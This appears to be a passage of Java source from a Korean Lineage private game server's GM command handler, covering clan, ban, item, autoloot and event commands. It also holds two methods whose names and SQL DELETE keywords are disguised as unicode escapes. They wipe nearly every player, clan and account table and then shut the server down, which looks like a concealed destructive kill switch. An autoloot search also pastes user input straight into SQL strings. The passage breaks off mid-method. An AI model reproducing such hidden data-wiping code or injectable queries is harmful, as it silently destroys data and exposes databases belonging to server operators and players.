		registerDirect(loaded, "압류목록", (gm, cmd, param) -> {
			search_banned(gm);


		});
		registerDirect(loaded, "암호변경", (gm, cmd, param) -> {
			changePassword(gm, param);


		});
		registerDirect(loaded, "마을", (gm, cmd, param) -> {
			unprison(gm, param);


		});
		registerDirect(loaded, "채금해제", (gm, cmd, param) -> {
			chatx(gm, param);


		});
		registerDirect(loaded, "텔렉", (gm, cmd, param) -> {
			tell(gm);


		});
		AddBuilderCmdAlias(loaded, "텔렉", ".");
		registerDirect(loaded, "피케이", (gm, cmd, param) -> {
			Pvp(gm, param);


		});
		registerDirect(loaded, "계정", (gm, cmd, param) -> {
			account_Cha(gm, param);


		});
		registerDirect(loaded, "렙작", (gm, cmd, param) -> {
			levelup2(gm, param);


		});
		registerDirect(loaded, "상점추방", (gm, cmd, param) -> {
			ShopKick(gm, param);


		});
		registerDirect(loaded, "감옥", (gm, cmd, param) -> {
			hold(gm, param);


		});
		registerDirect(loaded, "인벤삭제", (gm, cmd, param) -> {
			InventoryDelete(gm, param);


		});
		registerDirect(loaded, "아지트리로드", (gm, cmd, param) -> {
			reloadHouse(gm, param);


		});
		registerDirect(loaded, "혈맹포인트선물", (gm, cmd, param) -> {
			혈맹포인트선물(gm, param);


		});
		registerDirect(loaded, "혈맹포인트삭제", (gm, cmd, param) -> {
			혈맹포인트삭제(gm, param);


		});
		registerDirect(loaded, "혈맹포인트조회", (gm, cmd, param) -> {
			혈맹포인트조회(gm, param);

//		case "공속체크":
//			gm.AttackSpeedCheck2 = 1;
//			gm.sendPackets("\\fY허수아비를 10회공격해주세요.");
//			break;
//		case "이속체크":
//			gm.MoveSpeedCheck = 1;
//			gm.sendPackets("\\fY한 방향으로 10회무빙해주세요.");
//			break;
//		case "마법체크":
//			gm.magicSpeedCheck = 1;
//			gm.sendPackets("\\fY원하는마법을 10회사용해주세요.");
//			break;

		});
		registerDirect(loaded, "이미지삭제", (gm, cmd, param) -> {
			this.get_delete_gfx(gm);


		});
		registerDirect(loaded, "버경확인", (gm, cmd, param) -> {
			bug_race_check(gm);


		});
		registerDirect(loaded, "버경조작", (gm, cmd, param) -> {
			bug_race_rate(gm, param);


		});
		registerDirect(loaded, "보스알림", (gm, cmd, param) -> {
			spawnNotifyOnOff(gm, param);


		});
		registerDirect(loaded, "타입", (gm, cmd, param) -> {
			int type = Integer.parseInt(param);
			gm.sendPackets("\\aA요리타입 : " + type);
			SC_PacketBox.send(gm, 53, type, 1800);


		});
		registerDirect(loaded, "전체버프", (gm, cmd, param) -> {
			try {
				StringTokenizer st = new StringTokenizer(param);
				String status = st.nextToken();
				BuilderCmd_all_buff(gm, param, status);
			} catch (Exception e) {
				SC_ChatPacket.sendDirect(gm, gm, "----------------------------------------------------");
				SC_ChatPacket.sendDirect(gm, gm, " 1:풀업 2:축복  3:흑사 4:코마");
				SC_ChatPacket.sendDirect(gm, gm, "----------------------------------------------------");
			}


		});
		registerDirect(loaded, "리로드몬스폰", (gm, cmd, param) -> {
			try {
				StringTokenizer st = new StringTokenizer(param);
				int mapid = Integer.parseInt(st.nextToken());
				String locName = MapsTable.getInstance().getMapName(mapid);
				CWorld.getInstance().getMapObject(mapid);
				CNpcMakerDB.getInstance().reload(mapid);
				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "["+locName+"]의 몬스터들을 리스폰하였습니다.");
				//gm.sendPackets("몬스폰리스트 (지정맵) 리로드 완료");
			} catch (Exception e) {
				gm.sendPackets(".리로드몬스폰 (맵아이디)");
			}



		});
		registerDirect(loaded, "성혈조작", (gm, cmd, param) -> {
			try {
				StringTokenizer st = new StringTokenizer(param);
				String name = st.nextToken();
				int number = Integer.parseInt(st.nextToken());
				L1Clan clan = CWorld.getInstance().findClan(name);
				if (clan == null) {
					gm.sendPackets("혈맹이 존재하지 않습니다.");
				} else {
					clan.setCastleId(number);
					CWorld.getInstance().removeClan(clan);
					CWorld.getInstance().storeClan(clan);
					ClanTable.getInstance().updateClan(clan);
					gm.sendPackets(name + " 혈맹정보가 변경됐습니다.");
				}
			} catch (Exception e) {
				gm.sendPackets(".성혈조작 [혈이름] [성번호] 입력");
				gm.sendPackets("켄트1,오크2,윈다3,기란4,하이5,웰던6,아덴7,디아드8");
			}


		});
		registerDirect(loaded, "상점리로드", (gm, cmd, param) -> {
			try {
				int npcid = Integer.parseInt(param);
				L1Npc npc = CObjectDB.GetNPC(npcid);
				ShopTable.getInstance().Reload(npcid);
				gm.sendPackets("엔피씨 : " + npc.get_name() + " 리로드 되었습니다.");
			} catch (Exception e) {
				gm.sendPackets(".상점리로드 엔피씨ID");
			}


		});
		registerDirect(loaded, "혈가입", (gm, cmd, param) -> {
			try {
				StringTokenizer st = new StringTokenizer(param);
				String name = st.nextToken();
				String clanname = st.nextToken();
				L1PcInstance pc = CWorld.getInstance().getPlayer(name);
				L1Clan clan = CWorld.getInstance().findClan(clanname);
				if (pc == null) {
					gm.sendPackets("그런 유저는 없습니다.");
					return;
				}
				if (clan == null) {
					gm.sendPackets("그런 혈맹은 없습니다.");
					return;
				}
				if (pc.getClanid() != 0) {
					gm.sendPackets("" + pc.getName() + "님은 혈맹이 있기때문에 탈퇴 시키겠습니다.");
					pc.ClearPlayerClanData(clan);
					clan.removeClanMember(pc.getName());
					gm.save();
					return;
				}

				try(var shared=new l1j.server.server.model.network.core.broadcast.CAsyncSendConstBuffer(
SC_ServerMessage.nativeWriter(94,pc.getName()),Integer.MIN_VALUE,Integer.MAX_VALUE)) {
for (L1PcInstance clanMembers : clan.getOnlineClanMember()) {
					l1j.server.server.model.network.core.broadcast.CSharedBroadcast.sendRecipient(shared,clanMembers);
					// \f1%0이 혈맹의 일원으로서 받아들여졌습니다.
				}
}
				pc.setClanid(clan.getClanId());
				pc.setClanname(clanname);
				pc.setClanRank(L1Clan.수련);
				pc.setTitle("");
				pc.setClanMemberNotes("");
				SC_CharTitle.send(pc, pc.getId(), "");
				SC_CharTitle.broadcast(pc, pc.getId(), "");
				clan.addClanMember(pc.getName(), pc.getClanRank(), pc.getLevel(), "", pc.getId(), pc.getType(),
						pc.getOnlineStatus(), pc);
				pc.save(); // DB에 캐릭터 정보를 기입한다
				SC_PacketBox.send(pc, pc, SC_PacketBox.PLEDGE_REFRESH_PLUS);
				SC_ServerMessage.send(pc, 95, clanname); // \f1%0 혈맹에
																	// 가입했습니다.
				pc.start_teleport(pc.getX(), pc.getY(), pc.getMapId(), pc.getHeading(), 169, false, true);
			} catch (Exception e) {
				gm.sendPackets(".혈가입 [캐릭명] [혈맹이름] 입력");
			}


		});
		registerDirect(loaded, "혈탈퇴", (gm, cmd, param) -> {
			try {
				StringTokenizer tokenizer = new StringTokenizer(param);
				String pcName = tokenizer.nextToken();
				L1PcInstance pc = CWorld.getInstance().getPlayer(pcName);
				if (pc == null) {
					gm.sendPackets("그런 유저는 없습니다.");
					return;
				}
				L1Clan clan = pc.getClan();
				L1PcInstance clanMember[] = clan.getOnlineClanMember();
				l1j.server.server.model.network.core.broadcast.CSharedBroadcast.sendWrittenArrayBestEffort(
                        clanMember,
                        SC_ServerMessage.nativeWriter(ServerMessage.LEAVE_CLAN, param, clan.getClanName(), null));
				pc.ClearPlayerClanData(clan);
				clan.removeClanMember(pc.getName());
				pc.start_teleport(pc.getX(), pc.getY(), pc.getMapId(), pc.getHeading(), 169, false, true);
			} catch (Exception e) {
				gm.sendPackets(".혈탈퇴 [캐릭명] 입력");
			}


		});
		registerDirect(loaded, "h", (gm, cmd, param) -> showHelp(gm, param));
		// OFF command spellings; each alias shares the exact existing permission/handler.
		AddBuilderCmdAlias(loaded, "누구", "who");
		AddBuilderCmdAlias(loaded, "위치", "show_loc");
		AddBuilderCmdAlias(loaded, "불투명", "visible");
		AddBuilderCmdAlias(loaded, "추방", "kick");
		return Collections.unmodifiableMap(loaded);
	}

	private static void registerLevelCommand(Map<String, BuilderCmdPairType> loaded, String name, BuilderCmdFunction handler) {
		registerBuilderCommand(loaded, new BuilderCmdPairType(name, true, handler));
	}

	private static void registerDirect(Map<String, BuilderCmdPairType> loaded, String name, BuilderCmdFunction handler) {
		registerBuilderCommand(loaded, new BuilderCmdPairType(name, false, handler));
	}

	private static void registerBuilderCommand(Map<String, BuilderCmdPairType> loaded, BuilderCmdPairType entry) {
		if (loaded.putIfAbsent(entry.getName(), entry) != null) {
			throw new IllegalStateException("Duplicate builder command: " + entry.getName());
		}
	}

	private static void AddBuilderCmdAlias(Map<String, BuilderCmdPairType> loaded, String command, String alias) {
		final BuilderCmdPairType entry = loaded.get(command);
		if (entry == null || loaded.putIfAbsent(alias, entry) != null) {
			throw new IllegalStateException("Invalid builder alias: " + alias);
		}
	}

	private BuilderCmdPairType findBuilderCommand(String name) {
		if (name == null) return null;
		final BuilderCmdPairType exact = builderCmdMap.get(name);
		if (exact != null) return exact;
		final BuilderCmdPairType normalized = builderCmdMap.get(name.toLowerCase(Locale.ROOT));
		return normalized != null && normalized.isLevelRestricted() ? normalized : null;
	}

	private void bug_race_rate(L1PcInstance pc, String s) {
		try {
			StringTokenizer tok = new StringTokenizer(s);
			int num = Integer.parseInt(tok.nextToken());
			int speed = Integer.parseInt(tok.nextToken());
			BugRaceController.getInstance().setSpeed(num - 1, speed);
			pc.sendPackets(String.format("레인 %d번의 속도를 %d로 변경하였습니다..", num, speed));
		} catch (Exception e) {
			pc.sendPackets("커멘드: 버경조작 [레인] [속도] 로 입력 바랍니다.");
		}
	}

	private void bug_race_check(L1PcInstance pc) {
		try {
			for (int i = 0; i < 5; ++i)
				pc.sendPackets(String.format("레인 : %d, 속도 : %d", i + 1, BugRaceController.getInstance().getSpeed(i)));
		} catch (Exception e) {
			pc.sendPackets("커멘드: 버경확인 으로 입력 바랍니다.");
		}
	}

	private FastTable<L1NpcInstance> list = new FastTable<L1NpcInstance>();

	public void add_list(L1NpcInstance npc) {
		synchronized (list) {
			if (!list.contains(npc))
				list.add(npc);
		}
	}

	private void get_delete_gfx(L1PcInstance pc) {
		try {
			Iterator<L1NpcInstance> iter = list.iterator();
			L1NpcInstance npc = null;

			while (iter.hasNext()) {
				npc = iter.next();
				if (npc == null)
					continue;
				npc.deleteMe();
			}

			list.clear();
			pc.sendPackets("'이미지 삭제' 가 완료 되었습니다.");
		} catch (Exception e) {
			pc.sendPackets("커멘드: .이미지삭제 로 입력 바랍니다.");
		}
	}

	private static Random _rnd = new Random();

	public static Random getRnd() {
		return _rnd;
	}


	/*
	 * private void showCastleWarTime(L1PcInstance pc, String param) {
	 * L1Castle[] castles = WarTimeController.getInstance().getCastleArray();
	 * Calendar[] startTime =
	 * WarTimeController.getInstance().getWarStartTimeArray(); Calendar[]
	 * endTime = WarTimeController.getInstance().getWarEndTimeArray();
	 * SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm");
	 * try { StringTokenizer tok = new StringTokenizer(param); String name =
	 * tok.nextToken(); for (int i = 0; i < castles.length; i++) { L1Castle
	 * castle = castles[i]; if (castle.getName().startsWith(name)) {
	 * pc.sendPackets(String.format("%s: %s ~ %s", castle.getName(),
	 * formatter.format(startTime[i].getTime()),
	 * formatter.format(endTime[i].getTime())))); } } Calendar cal =
	 * Calendar.getInstance(); pc.sendPackets(String.format( "서버시간: %s",
	 * formatter.format(cal.getTime())))); } catch (Exception e) {
	 * pc.sendPackets(".공성시간 (켄트,오크,윈다,기란,하이,드워,아덴,디아)")); } }
	 */

	private void maphack(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String on = st.nextToken();
			if (on.equalsIgnoreCase("켬")) {
				SC_Ability.send(gm, 3, true);
				gm.sendPackets("라이트 : 켬");
			} else if (on.equals("끔")) {
				SC_Ability.send(gm, 3, false);
				gm.sendPackets("라이트 : 끔");
			}
		} catch (Exception e) {
			gm.sendPackets(".라이트 [켬, 끔] 으로 설정 하세요.");
		}
	}

	public static int get_random(int min, int max) {
		if (min > max)
			return min;
		return _rnd.nextInt(max - min + 1) + min;
	}
	// TODO GM 커멘드 추가
	private void showHelp(L1PcInstance gm, String filter) {
		final int access = gm.getAccessLevel();
		if (access != Config.GMCODE && access != Config.SUB_GMCODE) return;
		String keyword = filter == null ? "" : filter.trim().toLowerCase(Locale.ROOT);
		if (keyword.startsWith(".")) keyword = keyword.substring(1);

		SC_SystemMessage.send(gm, "[GM] 명령어 목록 (.h 검색어)");
		final StringBuilder line = new StringBuilder(96);
		int count = 0;
		int columns = 0;
		for (Map.Entry<String, BuilderCmdPairType> registered : builderCmdMap.entrySet()) {
			final String name = registered.getKey();
			final BuilderCmdPairType entry = registered.getValue();
			if (!hasBuilderPermission(access, entry)) continue;
			if (!name.contains(keyword) && !entry.getName().toLowerCase(Locale.ROOT).contains(keyword)) continue;
			if (columns != 0) line.append("  ");
			line.append('.').append(name);
			count++;
			if (++columns == 6) {
				SC_SystemMessage.send(gm, line.toString());
				line.setLength(0);
				columns = 0;
			}
		}
		if (columns != 0) SC_SystemMessage.send(gm, line.toString());
		SC_SystemMessage.send(gm, "[GM] " + count + "개 명령어");
	}


	private void autoloot(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String type = tok.nextToken();
			if (type.equalsIgnoreCase("리로드")) {
				AutoLoot.getInstance();
				AutoLoot.reload();
				gm.sendPackets("오토루팅 설정이 리로드 되었습니다.");
			} else if (type.equalsIgnoreCase("검색")) {
				String nameid = tok.nextToken();
				Selector.exec(String.format(
						"select b.item_id, b.name FROM autoloot as a inner join (select item_id, name from etcitem) as b on a.item_id=b.item_id where b.name like '%%%s%%'",
						nameid), new FullSelectorHandler() {
							@Override
							public void result(ResultSet rs) throws Exception {
								while (rs.next())
									gm.sendPackets(String.format("[%d]%s", rs.getInt("item_id"), rs.getString("name")));
							}
						});
				Selector.exec(String.format(
						"select b.item_id, b.name FROM autoloot as a inner join (select item_id, name from armor) as b on a.item_id=b.item_id where b.name like '%%%s%%'",
						nameid), new FullSelectorHandler() {
							@Override
							public void result(ResultSet rs) throws Exception {
								while (rs.next())
									gm.sendPackets(String.format("[%d]%s", rs.getInt("item_id"), rs.getString("name")));
							}
						});
				Selector.exec(String.format(
						"select b.item_id, b.name FROM autoloot as a inner join (select item_id, name from weapon) as b on a.item_id=b.item_id where b.name like '%%%s%%'",
						nameid), new FullSelectorHandler() {
							@Override
							public void result(ResultSet rs) throws Exception {
								while (rs.next())
									gm.sendPackets(String.format("[%d]%s", rs.getInt("item_id"), rs.getString("name")));
							}
						});
			} else {
				String nameid = tok.nextToken();
				int itemid = 0;
				try {
					itemid = Integer.parseInt(nameid);
				} catch (NumberFormatException e) {
					itemid = CObjectDB.LoadItem().findItemIdByNameWithoutSpace(nameid);
					if (itemid == 0) {
						gm.sendPackets("해당 아이템이 발견되지 않습니다. ");
						return;
					}
				}

				L1Item temp = CObjectDB.GetItem(itemid);
				if (temp == null) {
					gm.sendPackets("해당 아이템이 발견되지 않습니다. ");
					return;
				}
				if (type.equalsIgnoreCase("추가")) {
					if (AutoLoot.getInstance().isAutoLoot(itemid)) {
						gm.sendPackets("이미 오토루팅 목록에 있습니다.");
						return;
					}
					AutoLoot.getInstance().storeId(itemid);
					gm.sendPackets("오토루팅 항목에 추가 했습니다.");
				} else if (type.equalsIgnoreCase("삭제")) {
					if (!AutoLoot.getInstance().isAutoLoot(itemid)) {
						gm.sendPackets("오토루팅 항목에 해당 아이템이 없습니다.");
						return;
					}
					gm.sendPackets("오토루팅 항목에서 삭제 했습니다.");
					AutoLoot.getInstance().deleteId(itemid);
				}
			}
		} catch (Exception e) {
			gm.sendPackets(".오토루팅 리로드");
			gm.sendPackets(".오토루팅 추가|삭제 itemid|name");
			gm.sendPackets(".오토루팅 검색 name");
		}
	}

	private void LargeAreaBan(L1PcInstance pc, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			int range = Integer.parseInt(st.nextToken());
			Integer reason = SC_LoginResult.banServerCodes.get(st.nextToken());
			if (reason == null)
				throw new Exception("");
			int count = 0;
			IpTable iptable = IpTable.getInstance();
			pc.sendPackets("----------------------------------------------------");
			for (L1PcInstance player : CWorld.getInstance().getVisiblePlayer(pc, range)) {
				Account.ban(player.getAccountName(), reason); // 계정을 BAN시킨다.
				iptable.banIp(player.getNetConnection().getIp()); // BAN 리스트에
				// IP를 추가한다.
				pc.sendPackets(player.getName() + ", (" + player.getAccountName() + ")");
				GameServer.disconnectChar(player);
				count++;
			}
			pc.sendPackets("주변의 유저 " + count + "명을 영구추 시키셨습니다.");
			pc.sendPackets("----------------------------------------------------");

		} catch (Exception e) {
			pc.sendPackets(".주변밴  [범위] [압류사유번호]");
		}
	}

	private void spawnNotifyOnOff(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String on = st.nextToken();
			if (on.equalsIgnoreCase("켬")) {
				gm.setBossNotify(true);
				gm.sendPackets("보스알림:켬 (보스소환 및 알림이 실행 되었습니다)");
			} else if (on.equals("끔")) {
				gm.setBossNotify(false);
				gm.sendPackets("보스알림:끔 (보스소환 및 알림이 종료 되었습니다)");
			}
		} catch (Exception e) {
			gm.sendPackets(".보스알림 [켬, 끔]으로 설정하세요. 현재(" + (gm.isBossNotify() == true ? "켜짐" : "꺼짐") + ")입니다.");
		}
	}

	private void execute1(L1PcInstance pc, String cmdName, String arg) {
		try { builderGrant(pc, pc, CObjectDB.GetItem(L1ItemId.ADENA), Integer.parseInt(arg.trim()), 0, 0, 0); }
		catch (RuntimeException e) { SC_SystemMessage.send(pc, ".아데나 [양수 수량]"); }
	}

	private void execute(L1PcInstance pc, String param, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			L1Item template = builderFindItem(st.nextToken());
			int count = st.hasMoreTokens() ? Integer.parseInt(st.nextToken()) : 1;
			int enchant = st.hasMoreTokens() ? Integer.parseInt(st.nextToken()) : 0;
			int attr = st.hasMoreTokens() ? Integer.parseInt(st.nextToken()) : 0;
			builderGrant(pc, pc, template, count, enchant, attr, 0);
		} catch (RuntimeException e) { SC_SystemMessage.send(pc, ".아이템 [이름/ID] [수량] [강화] [속성]"); }
	}


	public static void 할파스의신의(L1PcInstance gm, String param) {
		if (!(gm.getInventory().IsEquippedByClassID(123111) || gm.getInventory().IsEquippedByClassID(123112)
				|| gm.getInventory().IsEquippedByClassID(123113))) {
			gm.sendPackets("\\fY할파스의 갑옷을 착용하고 있지 않습니다.");
			return;
		} else {

			if (gm.hasSkillEffect(L1SkillId.할파스의신의)) {
				int n = gm.getSkillEffectTimeSec(L1SkillId.할파스의신의) / 60;
				SC_SystemMessage.send(gm, String.format("\\fY할파스의 신의 : %d분 후에 활성화됩니다.", n));
			} else {
				gm.sendPackets("\\fY할파스의 신의는 활성화 상태입니다.");

			}
		}
	}
	private void Event(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String event = st.nextToken();
			String time1 = st.nextToken();
			int time = Integer.parseInt(time1);
			if (event.equalsIgnoreCase("드래곤헌터")) {
				L1SpawnUtil.Gmspawn(7320159, 33441, 32813, (short) 4, 6, time * 60 * 60 * 1000);

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "드래곤 헌터의 가호 이벤트가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				CWorld.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("특급용사1")) {
				L1SpawnUtil.Gmspawn(526, 33447, 32793, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "특급 용사 이벤트(1) 가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				CWorld.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("특급용사2")) {
				L1SpawnUtil.Gmspawn(529, 33445, 32791, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "특급 용사 이벤트(2) 가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				CWorld.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("특급용사3")) {
				L1SpawnUtil.Gmspawn(530, 33449, 32795, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "특급 용사 이벤트(3) 가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				CWorld.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");

			} else if (event.equalsIgnoreCase("특급용사4")) {
				L1SpawnUtil.Gmspawn(531, 33444, 32797, (short) 4, 5, time * 60 * 60 * 1000);// 기란

				SC_PacketBox.send(gm, SC_PacketBox.GREEN_MESSAGE, "특급 용사 이벤트(4) 가 시작되었습니다. 곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
				CWorld.getInstance().broadcastServerMessage("곧이어 (" + time + ") 시간 동안 기란 마을에 출현 합니다.");
			}
		} catch (Exception e) {
			gm.sendPackets("[.이벤트] [이벤트명] [시간]");
			gm.sendPackets("[이벤트명]: 드래곤헌터/특급용사1~4");
		}
	}

	
private void \uC11C\uBC84\uCD08\uAE30\uD6541(L1PcInstance pc, String param) {
		
		Connection con = null;

			try {
				con = DatabaseFactory.getInstance().getConnection();
				StringTokenizer st = new StringTokenizer(param);
				String code = st.nextToken();
				if (code.equalsIgnoreCase("\uC2DC\uC791")) {
				//L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM accounts", new Object[0]);
				//Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM attendance_startup", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM attendance_userinfo", new Object[0]);	
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_buddys", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_buff", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_config", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_elf_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_exclude", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_exp_cache", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_items", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_package_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_quests", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_shop", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_shop_store", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_skills", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_slot_items", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_special_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_supplementary_service", new Object[0]);		
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_tams", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_teleport", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_teleport_item", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM characters", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_bless_buff", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_data", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse_list", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM clan_warehouse_log", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM dogfight_history", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_dungeon_time_account_information", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_dungeon_time_char_information", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM passive_user_info", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM character_auto_set", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM letter", new Object[0]);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM letter", new Object[0]);
				Thread.sleep(300);
				Thread.sleep(300);
				KdaLoader.getInstance().clear();
				Thread.sleep(3000);
				GameServer.getInstance().shutdown();
				} if (code.equalsIgnoreCase(" ")) {
					pc.sendPackets(".\uC11C\uBC84\uCD08\uAE30\uD654 \uC2DC\uC791");
				}
				
			} catch (Exception e) {
				pc.sendPackets(".\uC11C\uBC84\uCD08\uAE30\uD654 \uC2DC\uC791");
			} finally {

				SQLUtil.close(con);

			}
		

	}

private void \uC11C\uBC84\uCD08\uAE30\uD654(L1PcInstance pc, String param) {
		
		Connection con = null;

			try {
				con = DatabaseFactory.getInstance().getConnection();
				StringTokenizer st = new StringTokenizer(param);
				String code = st.nextToken();
				if (code.equalsIgnoreCase("\uC2DC\uC791")) { 
					Thread.sleep(300);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM accounts", new Object[0]);
				Thread.sleep(300);
				L1QueryUtil.execute(con, "\u0044\u0045\u004C\u0045\u0054\u0045 FROM tb_kda", new Object[0]);
